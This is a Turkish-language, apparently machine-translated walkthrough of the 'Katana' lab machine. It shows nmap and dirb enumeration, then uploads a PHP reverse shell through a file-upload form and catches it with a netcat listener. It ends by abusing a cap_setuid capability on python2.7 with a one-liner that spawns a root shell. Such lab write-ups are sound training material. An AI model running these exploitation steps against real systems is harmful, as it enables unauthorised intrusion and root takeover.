      ####Enumeration

Nmap
Bir tarama çalıştırarak başlıyoruz :
kali@kali:~$ sudo nmap -p- $targetip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 11:33 EDT
Nmap scan report for $targetip
Host is up (0.030s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3389/tcp open  ms-wbt-server
7080/tcp open  empowerid
8088/tcp open  radan-http
8715/tcp open  unknown
9198/tcp open  unknown

Dirb
Varsayılan kelime listesini ve varsayılan kelime listesini kullanarak , 8088 numaralı bağlantı noktasında upload.html dosyasınıdirb kaba kuvvet uygulayabilir ve keşfedebiliriz :
kali@kali:~$ dirb http://$targetip:8088 -X .html -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Aug 20 14:05:14 2020
URL_BASE: http://$targetip:8088/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive
EXTENSIONS_LIST: (.html) | (.html) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://$targetip:8088/ ----
+ http://$targetip:8088/error404.html (CODE:200|SIZE:195)                                                
+ http://$targetip:8088/index.html (CODE:200|SIZE:655)                                                   
+ http://$targetip:8088/upload.html (CODE:200|SIZE:6480)                                                 
                                                                                                               
-----------------
END_TIME: Thu Aug 20 14:07:40 2020
DOWNLOADED: 4612 - FOUND: 3

      ####Exploitation

Dosya Yükleme Güvenlik Açığı
http://$targetip:8088/upload.html adresine giderken birkaç dosya yükleme kontrolü görüyoruz. Şu adreste bulunan PHP ters kabuğunu yükleyebiliriz /usr/share/webshells/php/php-reverse-shell.php:
kali@kali:~$ locate php-reverse-shell.php
...
/usr/share/webshells/php/php-reverse-shell.php
...
kali@kali:~$
PHP ters kabuğunda yerel bağlantı noktasını 4444 olarak ayarlayın. Yüklememiz için her iki kontrolü de seçebiliriz. Hazırlanan PHP ters kabuğunu seçtikten sonra Submit Query tıklayın . Aşağıdaki mesaj görünür:
Please wait for 1 minute!. Please relax!.

File : file1
Name :
Type :
Path :
Size : 0
Please wait for 1 minute!. Please relax!.

file is empty, not stored.

File : file2
Name : php-reverse-shell.php
Type : application/x-php
Path : /tmp/phpFjoLWh
Size : 5495
Please wait for 1 minute!. Please relax!.

Moved to other web server: /tmp/phpFjoLWh ====> /opt/manager/html/katana_php-reverse-shell.php
MD5 : 8783aa0d056e9e74e9d9856605d072a5
Size : 5495 bytes
Önemli olan kısım şudur:
Moved to other web server: /tmp/phpFjoLWh ====> /opt/manager/html/katana_php-reverse-shell.php
İlk olarak, 4444 numaralı bağlantı noktasında bir netcat dinleyicisi başlatın. nmap Taramadan, 8715 numaralı bağlantı noktasının açık olduğunu gördük. 
Biraz tahmin çalışması ve yukarıdaki mesajı kullanarak, http://$targetip:8715/katana_php adresine giderek ters kabuğu tetikleyebiliriz. -reverse-shell.php:
kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
$targetip: inverse host lookup failed: Unknown host
connect to [$attackerip] from (UNKNOWN) [$targetip] 57806
Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 13:36:02 up 1 min,  0 users,  load average: 0.03, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@katana:/$

      ####CATABILITIES
Dosya Yeteneklerini Kontrol Etme
Kök dizindeki özyinelemeli bayrağı kullanarak , izinli getcapdosya yeteneğinin şurada ayarlandığını görüyoruz :+eppython2.7
www-data@katana:~$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
www-data@katana:~$
Linux dosya yetenekleri çekirdek tarafından korunur. Bu kavram, SUID'nin nasıl çalıştığına benzer. Linux'un iş parçacığı ayrıcalık denetimi, yeteneklere dayalıdır.
Yetenekler, normalde ayrılmış eylemleri root daha küçük parçalara bölerek çalışır. Dosya yetenek kümeleri, adlı genişletilmiş bir öznitelikte depolanır security.capability.
Kendimizi bir kabuğa python2.7 bırakmak için yanlış yapılandırma yeteneklerini kötüye kullanabiliriz :root
www-data@katana:~$ whoami
whoami
www-data
www-data@katana:~$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<c 'import os; os.setuid(0); os.system("/bin/bash")'
root@katana:~# whoami
whoami
root
root@katana:~#
